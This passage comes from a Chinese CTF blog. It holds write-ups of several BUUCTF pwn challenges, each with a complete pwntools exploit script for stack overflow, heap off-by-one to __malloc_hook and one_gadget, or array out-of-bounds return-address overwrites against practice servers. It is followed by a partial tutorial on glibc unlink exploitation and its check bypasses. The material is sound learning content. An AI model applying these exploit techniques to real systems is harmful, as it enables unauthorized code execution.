class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="picoctf-2018-buffer"><a href="#picoctf-2018-buffer" class="headerlink" title="picoctf_2018_buffer"></a>picoctf_2018_buffer</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144721443.png"><span class="image-caption">image-20210728144721443</span></p>
<p>checksec的情况来看以及名字，应该是道栈题目，进入ida看看</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728144750715.png"><span class="image-caption">image-20210728144750715</span></p>
<p>漏洞点应该是在这了，存在明显栈溢出</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145612076.png"><span class="image-caption">image-20210728145612076</span></p>
<p>程序本身还蕴含着一个函数，这个函数会读取flag里面的内容，只要通过判断即可打印出flag</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728145716640.png"><span class="image-caption">image-20210728145716640</span></p>
<p>而这里的a1，a2就是该函数的参数。</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728150414970.png"><span class="image-caption">image-20210728150414970</span></p>
<p>成功获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28765</span>)<br>win_addr=<span class="hljs-number">0x080485CB</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0xDEADBEEF</span>)+p32(<span class="hljs-number">0xDEADC0DE</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please enter your string:&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><p>常规checksec一下，保护全开，可能是道堆题了，进入ida看看程序</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210728151846042.png"><span class="image-caption">image-20210728151846042</span></p>
<p>漏洞点在于write函数里面</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730125048904.png"><span class="image-caption">image-20210730125048904</span></p>
<p>这里会把我们之前申请堆块时输入的size与现在要写入的size进行比较，如果我们现在写入的size比原来的size大10，就可以多写一个，所以漏洞点是offbyone</p>
<p>泄露libc，因为calloc会清空堆块的数据，所以这边借着溢出，把is_mmap位改为1，就不会被清空数据，借此把libc泄露出来</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730215233503.png"><span class="image-caption">image-20210730215233503</span></p>
<p>然后就利用offbyone修改堆块的size，制造overlop，修改被覆盖的堆块的fd指针，然后把堆块申请到malloc_hook上去</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233057769.png"><span class="image-caption">image-20210730233057769</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210730233446054.png"><span class="image-caption">image-20210730233446054</span></p>
<p>这边我已经成功写进去了，但是没有getshell，四种都没办法getshell，那接下来，就有很多处理方式了</p>
<ul>
<li>转而去修改free_hook函数</li>
<li>利用realloc调整栈帧</li>
<li>house of orange（通杀2.23以及2.24）</li>
</ul>
<p>这边我使用realloc调整栈帧，其他方法后续会更新的（我也不知道后续是多久~）</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002134507.png"><span class="image-caption">image-20210731002134507</span></p>
<p>这边可以看见，并不会为NULL，所以one_gadget条件没有达成，然后看看realloc,会压栈</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002037708.png"><span class="image-caption">image-20210731002037708</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731002752890.png"><span class="image-caption">image-20210731002752890</span></p>
<p>发现，其实压栈导致的rsp-0x8，已经让one_gadget的条件达成了，所以就不用再去找了</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210731001850853.png"><span class="image-caption">image-20210731001850853</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./roarctf_2019_easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size+<span class="hljs-number">10</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\x93&#x27;</span>)<br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c4b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>rlh=libc_base+libc.sym[<span class="hljs-string">&#x27;&#x27;</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0x4526a</span><br>log.success(<span class="hljs-string">&quot;libc base==&gt;0x%x&quot;</span> %libc_base)<br>log.success(<span class="hljs-string">&quot;__malloc_hook==&gt;0x%x&quot;</span> %mlh)<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xd8</span>)<span class="hljs-comment">#2</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808202602382.png"><span class="image-caption">image-20210808202602382</span></p>
<p>先checksec一下，32位，开启保护只有nx</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808203034653.png"><span class="image-caption">image-20210808203034653</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205220758.png"><span class="image-caption">image-20210808205220758</span></p>
<p>ida里面十分简单，漏洞点就这么一些东西，说明就是一个栈溢出，而溢出算上返回地址，只有八个字节，给的后门函数是无法使用的，那么如果按照原来的构造方法，字节数是不够的，因为加上返回地址，那明显是要十二个字节。然后这边的字符要去找sh，只有sh也是可以getshell的，除此之外，那如果要不需要返回地址，那就要去跳转到这边的程序里面已经有的call _system，就可以不需要返回地址，因为call指令会自动的将下一条指令压入栈中作为返回地址</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808205011413.png"><span class="image-caption">image-20210808205011413</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27986</span>)<br>sys = <span class="hljs-number">0x8048529</span><br>sh = <span class="hljs-number">0x08048670</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span> + p32(sys) + p32(sh)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="qctf-2018-stack2"><a href="#qctf-2018-stack2" class="headerlink" title="qctf_2018_stack2"></a>qctf_2018_stack2</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210808210516960.png"><span class="image-caption">image-20210808210516960</span></p>
<p>checksec一下，32位，且有nx以及canary，那就要先去寻找怎么泄露canary了，不然是没法做的</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808214029860.png"><span class="image-caption">image-20210808214029860</span></p>
<p>分析了一下程序的功能，不存在溢出点，输入函数也都是用的scanf，只有这个地方应该是有问题的，首先这个数组的是在栈上的，而数组下标我们是可以控制的，那就存在了数组越界问题了。并且给了一个后门函数，那就可以逐个字节的输入进去，覆盖返回地址，这样也就不需要去泄露canary了</p>
<p>然后就是数组的偏移，直接看ida的反汇编是错误的，为什么会错？</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222850151.png"><span class="image-caption">image-20210808222850151</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808222112204.png"><span class="image-caption">image-20210808222112204</span></p>
<p>汇编代码可以解惑：由于这边的处理不同，导致ebp的下方并不是返回地址，而是还有一段距离，就要去调试获得了</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808225803029.png"><span class="image-caption">image-20210808225803029</span></p>
<p>我选择在下标为1的位置输入调试，而这边[ebp+eax*1-0x70]就是输入的数最终会存放的地方，因为我输的是0，所以可以算出的ebp-0x70就是数组的起始地址，这样只要再去算一下返回地址到这的偏移即可</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808230055266.png"><span class="image-caption">image-20210808230055266</span></p>
<p>算出偏移之后就是利用数组越界把后门函数地址写入到返回地址</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210808221957029.png"><span class="image-caption">image-20210808221957029</span></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25028</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>get_shell = [<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>	p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;change&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x84</span>+i))<br>	p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(get_shell[i]))<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812160620361.png"><span class="image-caption">image-20210812160620361</span></p>
<p>先checksec一下，64位，开启了nx和canary，可能要泄露canary，进入ida分析一下</p>
<p>进入程序，是个用c++编写的程序，看起来有些费力</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162011685.png"><span class="image-caption">image-20210812162011685</span></p>
<p>首先找到了一个后门函数，那么就再去找找输入点，看看有没有溢出，以及找找有没有函数调用的地方。然后可以发现，输入点是不存在溢出到返回地址的，但是可以找到一个能进行函数调用的地方</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812162329071.png"><span class="image-caption">image-20210812162329071</span></p>
<p>在整个程序的最后，进行密码验证，如果通过就会进行函数调用。那么，就去找找这个函数调用从哪里传入，是否可以修改？以及怎么通过检验</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165314541.png"><span class="image-caption">image-20210812165314541</span></p>
<p>首先通过验证，把这的账号密码输入进去即可</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165836228.png"><span class="image-caption">image-20210812165836228</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812165850893.png"><span class="image-caption">image-20210812165850893</span></p>
<p>然后就是要进行覆盖，把v8覆盖为后门函数，v8又来自vuln，而vuln似乎不是我们可以控制的变量。但是去查汇编代码，可以知道最后的函数调用，表现是call rax，那是否可以去修改rax的数据呢？</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812170456157.png"><span class="image-caption">image-20210812170456157</span></p>
<p>这里很有意思，在call rax前可以追溯到rax的值来自栈上一个数据，可以去看看能不能覆盖</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172747784.png"><span class="image-caption">image-20210812172747784</span></p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172859005.png"><span class="image-caption">image-20210812172859005</span></p>
<p>这里传入的rax的值就是源头，而这里的值是栈上的，并且我们是可以覆盖的，就是在第二个输入点输入密码的地方</p>
<p>成功getshell</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812164617984.png"><span class="image-caption">image-20210812164617984</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29528</span>)<br>shell = <span class="hljs-number">0x400E88</span><br><br>p.recvuntil(<span class="hljs-string">&quot;username:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;password:&quot;</span>)<br>payload = <span class="hljs-string">&quot;2jctf_pa5sw0rd&quot;</span>.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="mrctf2020-easyrop"><a href="#mrctf2020-easyrop" class="headerlink" title="mrctf2020_easyrop"></a>mrctf2020_easyrop</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812175441484.png"><span class="image-caption">image-20210812175441484</span></p>
<p>checksec，64位，只开启nx</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812180035772.png"><span class="image-caption">image-20210812180035772</span></p>
<p>首先程序存在后门，但是依照逻辑是不可能运行到后门的，所以需要劫持rip执行后门函数</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181120347.png"><span class="image-caption">image-20210812181120347</span></p>
<p>所有的输入点都是从var_310开始输入的，然而最大的输入长度也不过是0x300，不够覆盖到返回地址</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181040014.png"><span class="image-caption">image-20210812181040014</span></p>
<p>仔细分析程序，可以发现这边有个数组越界，这里的a1是var_310，所以可以先用别的函数输入数据，然后越界覆盖返回地址为后门函数</p>
<p>这边有个注意点：覆盖成功后退出程序时，程序还是会执行到数组越界的函数，所以这时候的输入只能是输入一个’\x00’，并且不能含有换行符，否则会接在前面输入的后门函数的地址上，导致地址无效了</p>
<p>在本地成功getshell，远程的docker可能出问题了，没有反应</p>
<p><img src="/2021/06/05/2021-06-14-buu06/image-20210812184240747.png"><span class="image-caption">image-20210812184240747</span></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26109)</span><br>p = process(<span class="hljs-string">&quot;./mrctf2020_easyrop&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>shell = <span class="hljs-number">0x40072A</span><br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2ff</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;hehehehehehehe\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x19</span> + p64(shell)<br>p.sendlineafter(<span class="hljs-string">&quot;bybybybybybyby\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>不安全的unlink</title>
    <url>/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</url>
    <content><![CDATA[<p>以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki</p>
<h1 id="不安全的unlink"><a href="#不安全的unlink" class="headerlink" title="不安全的unlink"></a>不安全的unlink</h1><h2 id="什么叫unlink"><a href="#什么叫unlink" class="headerlink" title="什么叫unlink"></a>什么叫unlink</h2><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlink</p>
<p>基本过程如下图所示</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p>
<p>上述的操作进行了如下的赋值</p>
<ul>
<li><p>*( fd + 0x18 ) = bk</p>
</li>
<li><p>*( bk + 0x10 ) = fd </p>
</li>
</ul>
<h3 id="unlink中的检查"><a href="#unlink中的检查" class="headerlink" title="unlink中的检查"></a>unlink中的检查</h3><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure>

<h2 id="利用unlink"><a href="#利用unlink" class="headerlink" title="利用unlink"></a>利用unlink</h2><p>要利用unlink首先要绕过上面提到的两个检查：</p>
<ol>
<li><p>size检查：</p>
<p>在堆中有两个地方存储了P的size：第一个是当前P-&gt;size，第二个是next_chunk-&gt;prev_size，比较两者大小</p>
</li>
<li><p>fd和bk检查：</p>
<p>检查P是否在双向链表中，在双向链表中有两个指针指向P：第一个是FD-&gt;bk，第二个是BK-&gt;fd</p>
</li>
</ol>
<p>在libc-2.27.so版本，要先填满tcache bin</p>
<h3 id="第一种思路"><a href="#第一种思路" class="headerlink" title="第一种思路"></a>第一种思路</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>存在UAF可以修改P的fd和bk</li>
<li>存在一个指针指向P</li>
</ol>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
<li>通过UAF漏洞修改chunk0-&gt;fd=G_ptr-0x18，chunk0-&gt;bk=G_ptr-0x10，绕过fd和bk检查</li>
<li>free下一个chunk，chunk0和chunk1合并，chunk0发生unlink，修改了G_ptr的值</li>
</ol>
<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写。</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png"><span class="image-caption">在这里插入图片描述</span></p>
<h3 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
<li>可以修改p的下一个chunk-&gt;pre_size和inuse位</li>
<li>存在一个指针指向chunk p的内容部分</li>
</ol>
<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ol>
<li><p>伪造fake_chunk：fakechunk-&gt;size=chunk0-0x10，可以绕过size检查</p>
<p>fakechunk-&gt;fd=&amp;G_ptr-0x18，fakechunk-&gt;bk = &amp;G_ptr-&gt;0x10，绕过fd和bk检查</p>
</li>
<li><p>修改下一个chunk的prev_size=chunksize-0x10。因为fakechunk比chunk0小0x10</p>
</li>
<li><p>修改下一个chunk的inuse位</p>
</li>
<li><p>free下一个堆块chunk1。fake chunk和chunk1合并，fake chunk发生unlink，修改了G_ptr的值</p>
</li>
</ol>
<h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png"><span class="image-caption">在这里插入图片描述</span></p>
<h2 id="例题hitcon2014-stkof"><a href="#例题hitcon2014-stkof" class="headerlink" title="例题hitcon2014_stkof"></a>例题hitcon2014_stkof</h2><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png"><span class="image-caption">image-20210831204845498</span></p>
<p>常规checksec一下，64位，开了NX、Canary</p>
<p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png"><span class="image-caption">image-20210831211106261</span></p>
<p>进入IDA，额，有个选项为4的功能似乎并没有作用，然后溢出点存在与修改函数中，对于我们能修改的长度是不存在什么限制的，所以能很轻易的造成堆溢出</p>
<p>题目没开PIE，所以堆结构的地址是已知的，整个程序不存在打印功能。这边的思路是：</p>
